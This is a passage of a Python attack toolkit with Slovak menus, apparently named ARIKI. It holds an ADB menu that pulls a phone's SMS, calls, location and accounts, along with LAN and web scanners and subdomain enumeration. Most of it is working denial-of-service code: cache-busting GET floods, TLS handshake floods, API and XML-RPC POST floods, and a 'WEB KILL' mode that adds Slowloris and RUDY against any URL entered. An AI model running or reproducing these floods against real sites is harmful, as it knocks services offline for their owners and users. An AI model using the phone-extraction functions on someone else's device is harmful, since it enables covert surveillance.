    print(f"      - na telefone zapni: Nastavenia -> Vyskusane moznosti -> ADB ladanie")
    print(f"      - kontrola: {C}adb devices{X}")
    print(f"\n  [1] Prehlad zariadenia (notifikacie + poloha + baterka)")
    print(f"  [2] Sledovanie notifikacii (zive, log do suboru)")
    print(f"  [3] Screenshot (ulozi PNG)")
    print(f"  [4] SMS (poslednych 20)")
    print(f"  [5] Hovory (poslednych 20)")
    print(f"  [6] Poloha (posledna zname miesto + mapa)")
    print(f"  [7] Procesy (top 15)")
    print(f"  [8] WiFi ADB - navod na pripojenie")
    print(f"  [9] Aplikacie (nainstalovane, len user)")
    print(f"  [10] WiFi + siete (SSID, IP, signal)")
    print(f"  [11] Ucty na zariadeni")
    print(f"  [12] Sietove data (prenos po rozhraniach)")
    print(f"  [13] Stav: obrazovka, RAM, uptime")
    ch = ask("vyber Device Watch")
    if ch == "1":
        dw_overview()
    elif ch == "2":
        dw_watch()
    elif ch == "3":
        dw_screen()
    elif ch == "4":
        dw_sms()
    elif ch == "5":
        dw_calls()
    elif ch == "6":
        loc = dw_loc()
        if not loc:
            print(f"  {Y}Poloha nedostupna (GPS vypnute / ziadna last location){X}")
        for prov, la, lo, acc in loc:
            print(f"  {G}{prov}{X} {la},{lo} (presnost {acc})")
            print(f"  {C}https://www.google.com/maps?q={la},{lo}{X}")
    elif ch == "7":
        dw_procs()
    elif ch == "9":
        print(f"\n  {C}=== USER APLIKACIE ==={X}")
        out = adb(["shell", "pm", "list", "packages", "-3"])
        print("  " + out.replace("\n", "\n  ") if out and not out.startswith("ERR") else "  (nic / adb chyba)")
    elif ch == "10":
        print(f"\n  {C}=== WIFI + SIETE ==={X}")
        w = adb(["shell", "cmd", "wifi", "status"])
        if w.startswith("ERR") or not w:
            w = adb(["shell", "dumpsys", "wifi"])
            keep = [l.strip() for l in w.splitlines() if any(k in l for k in ("SSID", "mWifiInfo", "Link speed", "RSSI"))]
            print("  " + ("\n  ".join(keep[:6]) if keep else "(nedostupne)"))
        else:
            print("  " + w.replace("\n", "\n  "))
        print(f"  {B}Sietove rozhrania:{X}")
        print("  " + adb(["shell", "ip", "addr"]).replace("\n", "\n  "))
    elif ch == "11":
        out = adb(["shell", "dumpsys", "account"])
        acc = [l.strip() for l in out.splitlines() if "Account {" in l or "name=" in l]
        print(f"\n  {C}=== UCTY ==={X}")
        if not acc or out.startswith("ERR"):
            print("  (nedostupne / bez opravnenia)")
        else:
            for a in acc[:25]:
                print("  ", a)
    elif ch == "12":
        print(f"\n  {C}=== SIETOVE DATA ==={X}")
        out = adb(["shell", "cat", "/proc/net/dev"])
        if out.startswith("ERR"):
            print("  " + out)
        for l in out.splitlines()[2:]:
            p = l.split(":")
            if len(p) != 2:
                continue
            v = p[1].split()
            try:
                rx, tx = int(v[0]) / 1e6, int(v[8]) / 1e6
                print(f"  {p[0].strip():12} rx={rx:8.1f} MB  tx={tx:8.1f} MB")
            except (ValueError, IndexError):
                pass
    elif ch == "13":
        print(f"\n  {C}=== STAV ZARIADENIA ==={X}")
        w = adb(["shell", "dumpsys", "window"])
        lock = [l.strip() for l in w.splitlines() if "Keyguard" in l and ("true" in l or "false" in l)][:3]
        print(f"  {B}Zamknuta obrazovka:{X}")
        for l in lock:
            print("   ", l)
        up = adb(["shell", "uptime"])
        print(f"  {B}Uptime:{X} " + up.split("up ")[-1][:35] if "up " in up else "  ?")
        mem = adb(["shell", "cat", "/proc/meminfo"]).splitlines()
        for l in mem[:3]:
            print("  ", l.strip())
    elif ch == "8":
        print(f"\n  {B}WiFi ADB (Android 11+):{X}")
        print(f"  1. Na telefone: Vyskusane moznosti -> Bezdrotove ADB ladanie -> ZAP")
        print(f"  2. Tam zistis: {C}IP:PORT{X} (napr. 192.168.1.10:5555)")
        print(f"  3. Tu spusti:  {C}adb pair IP:PORT{X} + zadaj PIN zo zariadenia")
        print(f"  4. Potom:      {C}adb connect IP:PORT{X}")
        print(f"  5. Over:       {C}adb devices{X} - zariadenie musi byt 'device'")
    else:
        print(f"  {R}Zly vyber{X}")

# ============================ 30. LAN WATCH (siet) ============================
LAN_VENDORS = {
    "00:0c:29": "VMware", "52:54:00": "QEMU/KVM", "00:50:56": "VMware",
    "d8:bb:c1": "Samsung", "8c:7b:9d": "Samsung", "f0:9f:c2": "Samsung",
    "98:0d:2e": "Xiaomi", "64:cc:2e": "Xiaomi", "5c:02:14": "Xiaomi",
    "78:8c:b5": "Huawei", "dc:d2:fc": "Huawei", "44:8e:df": "Huawei",
    "a4:83:e7": "Apple", "ac:bc:32": "Apple", "88:66:5a": "Apple",
    "00:1a:11": "TP-Link", "a4:c3:f0": "TP-Link", "04:4b:ed": "Raspberry Pi",
    "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
    "3c:22:fb": "Apple", "2c:60:fc": "LG", "50:e5:49": "Motorola",
}

def lan_myip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except OSError:
        ip = "127.0.0.1"
    s.close()
    return ip

def lan_ping(ip):
    try:
        r = subprocess.run(["ping", "-c", "1", "-W", "0.3", ip],
                           capture_output=True, timeout=2)
        return r.returncode == 0
    except Exception:
        return False

def lan_scan(net):
    hosts = []
    with ThreadPoolExecutor(max_workers=64) as ex:
        futs = {ex.submit(lan_ping, f"{net}.{i}"): i for i in range(1, 255)}
        for f in as_completed(futs):
            if f.result():
                hosts.append(futs[f])
    macs = {}
    try:
        out = subprocess.check_output(["ip", "neigh", "show"], text=True,
                                      timeout=5, errors="replace")
        for line in out.splitlines():
            p = line.split()
            if len(p) >= 4 and p[0].startswith(f"{net}.") and p[1] == "lladdr" and len(p[2]) == 17:
                macs[p[0]] = p[2]
    except Exception:
        pass
    return [{"ip": f"{net}.{h}", "mac": macs.get(f"{net}.{h}", "")} for h in sorted(hosts)]

def lan_vendor(mac):
    if not mac:
        return "?"
    return LAN_VENDORS.get(mac[:8].lower(), "?")

def lan_known_file():
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), "netlab_lan_devices.txt")

def lan_load_known():
    known = {}
    try:
        for line in open(lan_known_file()):
            p = line.strip().split("\t")
            if len(p) >= 2:
                known[p[0]] = p[1]
    except Exception:
        pass
    return known

def lan_overview():
    myip = lan_myip()
    net = ".".join(myip.split(".")[:3])
    print(f"\n  {C}=== LAN PREHLAD ({myip} / {net}.0/24) ==={X}")
    print(f"  {Y}Skenujem 254 hostov ...{X}")
    devs = lan_scan(net)
    print(f"  {B}Najdenych {len(devs)} zariadeni:{X}")
    for d in devs:
        print(f"  {G}{d['ip']:15}{X} {d['mac'] or '?':18} {lan_vendor(d['mac'])}")

def lan_watch():
    myip = lan_myip()
    net = ".".join(myip.split(".")[:3])
    interval = float(ask("interval skenu v s", "15"))
    known = lan_load_known()
    logp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "netlab_lan.log")
    print(f"  {Y}[!] Alarm na NEZNAME zariadenia kazdych {interval:g} s - Ctrl+C pre koniec{X}")
    print(f"      znamych: {len(known)}, log: {logp}")
    try:
        while True:
            devs = lan_scan(net)
            for d in devs:
                if d["mac"] and d["mac"] not in known:
                    msg = (f"[{dw_ts()}] NEZNAME ZARIADENIE: {d['ip']} {d['mac']} "
                           f"({lan_vendor(d['mac'])})")
                    print(f"  {R}{msg}{X}")
                    with open(logp, "a") as f:
                        f.write(msg + "\n")
            for d in devs:
                if d["mac"]:
                    known.setdefault(d["mac"], d["ip"])
            with open(lan_known_file(), "w") as f:
                for m, ip in known.items():
                    f.write(f"{m}\t{ip}\n")
            print(f"  {C}[{dw_ts()}]{X} {len(devs)} zariadeni (alarm zapnuty)")
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n  {Y}Ukoncene. Zname zariadenia: {lan_known_file()}{X}")

def lan_known_list():
    known = lan_load_known()
    print(f"\n  {C}=== ZNAME ZARIADENIA ({len(known)}) ==={X}")
    for mac, ip in sorted(known.items()):
        print(f"  {mac}  {ip}  {lan_vendor(mac)}")

def lan_watch_menu():
    print(f"  {C}--- LAN WATCH (vlastna siet) ---{X}")
    print(f"  {Y}[!] Monitoruje TVOJU vlastnu siet - upozorni na NEZNAME zariadenia{X}")
    print(f"\n  [1] Prehlad siete (najdi vsetky zariadenia)")
    print(f"  [2] Sledovanie s alarmom (nezname = cerveny alarm + log)")
    print(f"  [3] Zoznam znamych zariadeni")
    ch = ask("vyber LAN Watch")
    if ch == "1":
        lan_overview()
    elif ch == "2":
        lan_watch()
    elif ch == "3":
        lan_known_list()
    else:
        print(f"  {R}Zly vyber{X}")

# ============================ 31-34. WEB TESTY ============================
WEB_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

WEB_PATHS = ["admin", "admin/", "administrator/", "login", "user", "account",
             "panel/", "cpanel/", "dashboard/", "wp-admin/", "wp-login.php",
             "wp-content/", "wp-includes/", "wp-json/", "wp-config.php.bak",
             "phpmyadmin/", "phpMyAdmin/", "pma/", ".env", ".git/config",
             ".gitignore", "backup.zip", "backup.tar.gz", "backup/", "db.sql",
             "dump.sql", "database.sql", "info.php", "phpinfo.php", "test.php",
             "config.php.bak", "config.old", "robots.txt", "sitemap.xml",
             ".htaccess", "server-status", "server-info", "api/", "api/v1/",
             "graphql", "swagger/", "docs/", "uploads/", "images/", "feed",
             "xmlrpc.php", "error", "404", "search", "cart", "checkout",
             "install/", "setup/", "readme.html", "license.txt", "CHANGELOG.txt"]

def wfetch(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": WEB_UA,
                                                   "Accept": "*/*"})
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read()
        return r.status, dict(r.headers.items()), len(body)
    except Exception as e:
        code = getattr(e, "code", None)
        hdrs = dict(getattr(e, "headers", {}).items()) if hasattr(e, "headers") else {}
        if code:
            return code, hdrs, 0
        return None, {}, 0

def web_scan():
    url = ask("vstupna URL", "https://example.com").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    thr = int(ask("paralelnych vlaken [20]", "20"))
    base = url.rstrip("/") + "/"
    print(f"  {Y}Skenujem {len(WEB_PATHS)} ciest na {base} ...{X}")
    found = []
    def probe(path):
        st, hdrs, size = wfetch(base + path)
        if st and st != 404 and st != 410:
            found.append((st, size, path, hdrs.get("Location", "")))
    with ThreadPoolExecutor(max_workers=thr) as ex:
        futures = {ex.submit(probe, p): p for p in WEB_PATHS}
        for f in as_completed(futures):
            pass
    found.sort(key=lambda x: (x[0], x[2]))
    print(f"\n  {C}=== NALEZENE CIESTA ({len(found)}) ==={X}")
    for st, size, path, loc in found:
        col = G if st < 400 else Y
        extra = f" -> {loc[:60]}" if loc else f" ({size} B)"
        print(f"  {col}{st}{X} /{path}{extra}")

def sec_audit():
    url = ask("URL", "https://example.com").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    st, hdrs, size = wfetch(url)
    if not st:
        print(f"  {R}[!] Nedostupne{X}")
        return
    print(f"\n  {C}=== SECURITY AUDIT {url} ==={X}")
    score = 0
    total = 0
    def check(name, ok, tip):
        nonlocal score, total
        total += 1
        if ok:
            score += 1
            print(f"  {G}OK{X}  {name}")
        else:
            print(f"  {R}CHYBA{X} {name}  {Y}[tip: {tip}]{X}")
    h = lambda k: hdrs.get(k, "")
    if url.startswith("https"):
        check("HSTS (Strict-Transport-Security)", bool(h("Strict-Transport-Security")),
              "pridaj Strict-Transport-Security: max-age=63072000")
    check("Clickjacking ochrana (X-Frame-Options/CSP frame-ancestors)",
          bool(h("X-Frame-Options")) or "frame-ancestors" in h("Content-Security-Policy"),
          "X-Frame-Options: DENY alebo CSP frame-ancestors")
    check("Content-Security-Policy", bool(h("Content-Security-Policy")),
          "pridaj CSP hlavicku")
    check("X-Content-Type-Options: nosniff", h("X-Content-Type-Options") == "nosniff",
          "X-Content-Type-Options: nosniff")
    check("Referrer-Policy", bool(h("Referrer-Policy")),
          "Referrer-Policy: strict-origin-when-cross-origin")
    check("Permissions-Policy", bool(h("Permissions-Policy")),
          "pridaj Permissions-Policy")
    if h("Server"):
        print(f"  {Y}INFO{X} Server banner odhaleny: {h('Server')}  (skry ho)")
    if h("X-Powered-By"):
        print(f"  {Y}INFO{X} X-Powered-By: {h('X-Powered-By')}  (skry ho)")
    cookies = [c for c in hdrs.get("Set-Cookie", "").split(",") if c.strip()]
    for c in cookies:
        name = c.split("=")[0].strip()
        flags = [f.lower() for f in c.split(";")[1:]]
        total += 1
        ok = "httponly" in flags
        if ok:
            score += 1
            print(f"  {G}OK{X}  cookie {name}: HttpOnly")
        else:
            print(f"  {R}CHYBA{X} cookie {name}: chyba HttpOnly")
        total += 1
        if "secure" in flags:
            score += 1
            print(f"  {G}OK{X}  cookie {name}: Secure")
        else:
            print(f"  {R}CHYBA{X} cookie {name}: chyba Secure flag")
    if url.startswith("https"):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": WEB_UA})
            resp = urllib.request.urlopen(req, timeout=10)
            cert = resp.getpeercert()
            if cert:
                exp = cert.get("notAfter", "")
                print(f"  {B}INFO{X} TLS cert platny do: {exp}")
                print(f"  {B}INFO{X} Vydany pre: {cert.get('subjectAltName', [])[:3]}")
                try:
                    exp_t = time.mktime(time.strptime(exp[:25], "%b %d %H:%M:%S %Y"))
                    if exp_t < time.time():
                        print(f"  {R}CHYBA{X} certifikat EXPIROVAL")
                    else:
                        dni = int((exp_t - time.time()) / 86400)
                        print(f"  {G}OK{X}  certifiikat platny este {dni} dni")
                        score += 1
                    total += 1
                except Exception:
                    pass
            resp.close()
        except Exception as e:
            print(f"  {Y}INFO{X} TLS: {e}")
    print(f"\n  {B}Vysledok: {G}{score}/{total}{X} bezpecnostnych kontrol")
    if total and score / total >= 0.8:
        print(f"  {G}Dobre zabezpecene.{X}")
    elif total and score / total >= 0.5:
        print(f"  {Y}Stredna uroven - vylepsi chybajuce hlavicky.{X}")
    else:
        print(f"  {R}Slabe zabezpecenie - dolezite hlavicky chybaju.{X}")

CMS_PROBES = [
    ("wp-login.php", "WordPress"), ("wp-content/", "WordPress"), ("feed", "WordPress"),
    ("administrator/", "Joomla"), ("media/system/js/", "Joomla"),
    ("sites/default/", "Drupal"), ("core/install.php", "Drupal"),
    ("bitrix/", "Bitrix"), ("bitrix/admin/", "Bitrix"),
    ("img/logo.png", "PrestaShop"), ("modules/", "PrestaShop"),
    ("shop/", "WooCommerce-shop"),
    ("themes/", "CMS-tema"), ("catalog/", "OpenCart"),
    ("sitemap_index.xml", "Yoast/WordPress"),
]

def cms_detect():
    url = ask("URL", "https://example.com").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    base = url.rstrip("/") + "/"
    print(f"  {Y}Detekcia CMS na {base} ...{X}")
    hits = set()
    def probe(path, cms):
        st, hdrs, size = wfetch(base + path)
        if st and st < 500:
            hits.add(cms)
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(probe, p, c): p for p, c in CMS_PROBES}
        for f in as_completed(futs):
            pass
    st, hdrs, size = wfetch(base)
    print(f"\n  {C}=== CMS DETEKCIA ==={X}")
    gen = hdrs.get("X-Generator", "") or hdrs.get("X-Powered-By", "") or hdrs.get("Server", "")
    if gen:
        print(f"  {B}Hlavicky:{X} {gen}")
    special = ""
    for k, v in hdrs.items():
        if "shop" in k.lower() or "wix" in k.lower() or "cloudflare" in k.lower():
            special += f"{k}: {v}  "
    if special:
        print(f"  {B}Specialne:{X} {special}")
    check_shopify = "X-ShopId" in hdrs or "X-Shopify" in hdrs or "cdn.shopify" in gen
    if check_shopify:
        hits.add("Shopify")
    if "X-Wix" in hdrs:
        hits.add("Wix")
    if not hits:
        print(f"  {Y}Ziadny znamy CMS nenajdeny (moze byt vlastny/vlastny framework){X}")
    for cms in sorted(hits):
        print(f"  {G}[!] {cms}{X}")

def sub_osint():
    domain = ask("domena", "example.com").strip()
    print(f"  {Y}Zbieram subdomeny z crt.sh (Certificate Transparency) ...{X}")
    try:
        req = urllib.request.Request(
            "https://crt.sh/?q=%25." + domain + "&output=json",
            headers={"User-Agent": WEB_UA})
        raw = urllib.request.urlopen(req, timeout=25).read()
        import json
        data = json.loads(raw)
    except Exception as e:
        print(f"  {R}[!] crt.sh zlyhal: {e}{X}")
        return
    names = set()
    for entry in data:
        for n in str(entry.get("name_value", "")).split("\n"):
            n = n.strip().lower()
            if n and n.endswith("." + domain) and not n.startswith("*."):
                names.add(n)
    print(f"  {B}Nalezenych {len(names)} subdomen, resolvujem ...{X}")
    def resolve(name):
        try:
            return socket.gethostbyname(name)
        except socket.gaierror:
            return None
    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = {ex.submit(resolve, n): n for n in names}
        rows = []
        for f in as_completed(futs):
            n = futs[f]
            ip = f.result()
            rows.append((n, ip))
    rows.sort()
    alive = 0
    for n, ip in rows:
        if ip:
            alive += 1
            print(f"  {G}{n:45}{X} {ip}")
        else:
            print(f"  {Y}{n:45}{X} (neresolvuje)")
    print(f"\n  {B}Zive: {G}{alive}{X} / {len(rows)}")

def _drain(c):
    try:
        prev = c.gettimeout()
        c.settimeout(0)
        try:
            c.recv(65536)
            return True
        except (socket.timeout, BlockingIOError,
                ssl.SSLWantReadError, ssl.SSLWantWriteError):
            return True
        except OSError:
            return False
        finally:
            c.settimeout(prev)
    except Exception:
        return False

# ============================ 35-38. WEB UTOKY ============================
def tg_cache_worker(pid, host, port, tls, path, st, stop):
    binder(pid)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conns = []
    proven = set()
    n = 0
    last_sync = time.time()
    burst_n = 48
    ua = f"User-Agent: {make_ua()}\r\n"
    while not stop.is_set():
        if len(conns) < 16:
            for _ in range(4):
                if len(conns) >= 16:
                    break
                try:
                    c = socket.socket()
                    c.settimeout(1)
                    c.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    c.connect((host, port))
                    if tls:
                        c = ctx.wrap_socket(c, server_hostname=host)
                    conns.append(c)
                except Exception:
                    with st.err.get_lock():
                        st.err.value += 1
                    time.sleep(0.02)
                    break
        if not conns:
            time.sleep(0.05)
            continue
        paths = path if isinstance(path, list) else [path]
        burst = []
        for _ in range(burst_n):
            pth = random.choice(paths)
            sep = "&cb=" if "?" in pth else "?cb="
            burst.append((f"GET {pth}{sep}{random.randint(0, 0x7FFFFFFF)} HTTP/1.1\r\n"
                          f"Host: {host}\r\n{ua}"
                          f"Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\n"
                          f"Connection: keep-alive\r\n\r\n").encode())
        g = b"".join(burst)
        alive = []
        for c in conns:
            try:
                c.sendall(g)
                n += burst_n
                proven.add(id(c))
                alive.append(c)
            except socket.error:
                if id(c) not in proven:
                    with st.err.get_lock():
                        st.err.value += 1
                proven.discard(id(c))
                try:
                    c.close()
                except Exception:
                    pass
        conns = alive
        for c in alive:
            if not _drain(c):
                if id(c) not in proven:
                    with st.err.get_lock():
                        st.err.value += 1
                proven.discard(id(c))
                try:
                    c.close()
                except Exception:
                    pass
        conns = [c for c in conns if c.fileno() != -1]
        if n >= 16384 or (n >= 512 and time.time() - last_sync > 0.2):
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
            last_sync = time.time()
    if n:
        with st.cnt.get_lock():
            st.cnt.value += n

def cache_flood():
    url = ask("URL (ciel)", "").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    p = urlparse(url)
    host = p.netloc.split(":")[0]
    port = p.port or (443 if p.scheme == "https" else 80)
    path = p.path or "/"
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), tg_cache_worker,
                  (host, port, p.scheme == "https", path, st, stop))
    live(st, stop, procs, dur, f"Cache-Buster {url}", "req")

def tls_flood_worker(pid, host, port, st, stop):
    binder(pid)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    COUNTS = [0] * 8

    def hs(i):
        nonlocal COUNTS
        n = 0
        while not stop.is_set():
            try:
                c = socket.socket()
                c.settimeout(4)
                c.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                c.connect((host, port))
                ctx.wrap_socket(c, server_hostname=host).close()
                n += 1
                if n >= 512:
                    COUNTS[i] += n
                    n = 0
            except Exception:
                pass
        COUNTS[i] += n

    ths = [threading.Thread(target=hs, args=(i,), daemon=True) for i in range(8)]
    for t in ths:
        t.start()
    while not stop.is_set():
        time.sleep(0.2)
        n = sum(COUNTS)
        if n:
            with st.cnt.get_lock():
                st.cnt.value += n
            for i in range(8):
                COUNTS[i] = 0
    for t in ths:
        t.join(timeout=1)

def tls_flood():
    host = ask("ciel (domena)", "")
    port = int(ask("port", "443"))
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), tls_flood_worker, (host, port, st, stop))
    live(st, stop, procs, dur, f"TLS handshake flood {host}:{port}", "handshake")

def api_worker(pid, host, port, tls, path, st, stop):
    binder(pid)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conns = []
    proven = set()
    n = 0
    last_sync = time.time()
    burst_n = 36
    ua = f"User-Agent: {make_ua()}\r\n"
    while not stop.is_set():
        if len(conns) < 14:
            for _ in range(4):
                if len(conns) >= 14:
                    break
                try:
                    c = socket.socket()
                    c.settimeout(1)
                    c.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    c.connect((host, port))
                    if tls:
                        c = ctx.wrap_socket(c, server_hostname=host)
                    conns.append(c)
                except Exception:
                    with st.err.get_lock():
                        st.err.value += 1
                    time.sleep(0.02)
                    break
        if not conns:
            time.sleep(0.05)
            continue
        paths = path if isinstance(path, list) else [path]
        burst = []
        ts = int(time.time() * 1000)
        for i in range(burst_n):
            pth = random.choice(paths)
            if pth.endswith("/xmlrpc.php"):
                srcip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                body = (f'<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
                        f'<params><param><value><string>http://{srcip}/p{random.randint(1,99999)}</string></value></param>'
                        f'<param><value><string>http://{host}{pth}?p={random.randint(1,999)}</string></value></param>'
                        f'</params></methodCall>').encode()
                ct = "text/xml"
            else:
                body = (f'{{"user": "u{random.randint(0, 9999)}",'
                        f'"ts": {ts + i},'
                        f'"val": "{random.randint(0, 10**12)}"}}').encode()
                ct = "application/json"
            burst.append((f"POST {pth} HTTP/1.1\r\nHost: {host}\r\n{ua}"
                          f"Content-Type: {ct}\r\nAccept: */*\r\n"
                          f"Accept-Encoding: gzip, deflate, br\r\n"
                          f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n"
                          ).encode() + body)
        g = b"".join(burst)
        alive = []
        for c in conns:
            try:
                c.sendall(g)
                n += burst_n
                proven.add(id(c))
                alive.append(c)
            except socket.error:
                if id(c) not in proven:
                    with st.err.get_lock():
                        st.err.value += 1
                proven.discard(id(c))
                try:
                    c.close()
                except Exception:
                    pass
        conns = alive
        for c in alive:
            if not _drain(c):
                if id(c) not in proven:
                    with st.err.get_lock():
                        st.err.value += 1
                proven.discard(id(c))
                try:
                    c.close()
                except Exception:
                    pass
        conns = [c for c in conns if c.fileno() != -1]
        if n >= 16384 or (n >= 512 and time.time() - last_sync > 0.2):
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
            last_sync = time.time()
    if n:
        with st.cnt.get_lock():
            st.cnt.value += n

def api_flood():
    url = ask("API endpoint URL", "").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    p = urlparse(url)
    host = p.netloc.split(":")[0]
    port = p.port or (443 if p.scheme == "https" else 80)
    path = p.path or "/"
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), api_worker,
                  (host, port, p.scheme == "https", path, st, stop))
    live(st, stop, procs, dur, f"API POST {url}", "req")

def web_kill_all():
    hd("ARIKI \u00b7 WEB KILL VSAKO")
    url = ask("URL (ciel)", "").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    dur = float(ask("trvanie v s (0 = ne)", "10"))
    sil = int(ask("sila 1-10", "7"))
    p = urlparse(url)
    host = p.netloc.split(":")[0]
    port = p.port or (443 if p.scheme == "https" else 80)
    tls = p.scheme == "https"
    path = p.path or "/"
    st = Stats(); stop = event()
    plan = [
        ("CacheBuster", tg_cache_worker, (host, port, tls, path, st, stop)),
        ("TLS handshake", tls_flood_worker, (host, port, st, stop)),
        ("API POST", api_worker, (host, port, tls, path, st, stop)),
        ("Slowloris", slow_worker, (host, port, tls, host, st, stop, 20.0)),
        ("RUDY", rudy_worker, (host, port, tls, host, st, stop)),
    ]
    procs = []
    for nm, wf, args in plan:
        procs += spawn(nprocs(sil), wf, args)
    names = ", ".join(n for n, _, _ in plan)
    print(f"  {Y}Spustam vsetky vrstvy:{X} {names}")
    live(st, stop, procs, dur, f"WEB KILL vsako {host}:{port}", "utokov")


# ============================ 39. WEB AUTO KILL ============================
WEB_AUTO_PORTS = [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000]

HEAVY_PATHS = [
    # prihlasenie / admin / panel (kazdy web)
    "/login", "/login/", "/signin", "/sign-in", "/prihlasenie", "/admin",
    "/admin/", "/administrator/", "/administrator", "/panel", "/dashboard",
    "/dashboard/", "/account", "/account/", "/user/login", "/member", "/members",
    # hladanie / zoznamy (DB dotazy)
    "/search", "/search?q=a", "/search/?q=a", "/?s=a", "/index.php?s=a",
    "/q", "/find", "/hledat", "/vyhladavanie", "/category", "/category/",
    "/tag/a", "/page/2", "/products?page=2", "/produkty?strana=2",
    # API / RPC (kazdy CMS/framework)
    "/api", "/api/", "/api/v1", "/api/v1/", "/graphql", "/graphql/",
    "/v1", "/rest", "/json", "/rpc", "/ajax", "/ajax/",
    # interpretery / skripty (PHP, CGI)
    "/index.php", "/app.php", "/router.php", "/main.php", "/info.php",
    "/phpinfo.php", "/test.php", "/test/", "/cgi-bin/", "/cgi-bin/status",
    "/server-status", "/status", "/status/", "/ping",
    # e-shop / objednavky
    "/cart", "/cart/", "/checkout", "/checkout/", "/kosik", "/nakup",
    "/objednavka", "/shop", "/eshop", "/order", "/basket",
    # CMS-specificke (nech to funguje aj tam, kde su)
    "/wp-login.php", "/wp-admin/", "/wp-cron.php", "/wp-json/wp/v2/posts",
    "/?rest_route=/wp/v2/users", "/xmlrpc.php",
    "/index.php?option=com_users", "/administrator/index.php",
    "/user/login.html", "/index.php?route=account/login",
]

def svc_probe(host, port, tls, path="/"):
    def tls_wrap(s):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(s, server_hostname=host)
    def read_head(s):
        data = b""
        s.settimeout(4)
        try:
            while b"\r\n\r\n" not in data:
                c = s.recv(4096)
                if not c:
                    break
                data += c
        except Exception:
            pass
        return data[:32768].split(b"\r\n\r\n")[0].decode(errors="ignore")
    info = {"ok": False, "status": 0, "banner": "", "cookies": 0,
            "redirect": 0, "post_ok": False, "tls": tls, "loc": ""}
    try:
        s = socket.create_connection((host, port), timeout=4)
        if tls:
            s = tls_wrap(s)
        s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"User-Agent: {make_ua()}\r\nConnection: close\r\n"
                   f"Accept: */*\r\n\r\n").encode())
        head = read_head(s)
        s.close()
        lines = head.split("\r\n")
        if lines and lines[0].startswith("HTTP/"):
            info["ok"] = True
            info["status"] = int(lines[0].split(" ", 2)[1])
            for ln in lines[1:]:
                k, _, v = ln.partition(":")
                k, v = k.strip().lower(), v.strip()
                if k == "server":
                    info["banner"] = v[:40]
                elif k == "set-cookie":
                    info["cookies"] += 1
                elif k == "location" and not info["loc"]:
                    info["loc"] = v
            info["redirect"] = bool(info["loc"])
        if info["ok"]:
            body = b"a=1"
            s = socket.create_connection((host, port), timeout=4)
            if tls:
                s = tls_wrap(s)
            s.sendall((f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                       f"Content-Type: application/x-www-form-urlencoded\r\n"
                       f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                       ).encode() + body)
            if read_head(s).startswith("HTTP/"):
                info["post_ok"] = True
            s.close()
    except Exception:
        pass
    return info

def web_kill_auto():
    hd("ARIKI \u00b7 WEB AUTO KILL [sken + vyber]")
    url = ask("URL (ciel)", "").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    dur = float(ask("trvanie v s (0 = ne)", "10"))
    sil = int(ask("sila 1-10", "7"))
    p = urlparse(url)
    host = p.netloc.split(":")[0]
    port = p.port or (443 if p.scheme == "https" else 80)
    tls = p.scheme == "https"
    path = p.path or "/"
    ip = get_ip(host)
    if not ip:
        return
    st = Stats(); stop = event()
    active = []

    def boot(nm, wf, args, n=None):
        pr = spawn(n or nprocs(sil), wf, args)
        active.extend(pr)
        return pr

    def pick_svc(ph, pt):
        if pt["ok"] and (tls or not ph["ok"] or ph["loc"].startswith("https")):
            return pt
        return ph

    def get_site_paths():
        paths = list(HEAVY_PATHS)
        try:
            req = urllib.request.Request(url, headers={"User-Agent": make_ua()})
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            if url.startswith("https"):
                r = urllib.request.urlopen(req, timeout=6, context=ctx)
            else:
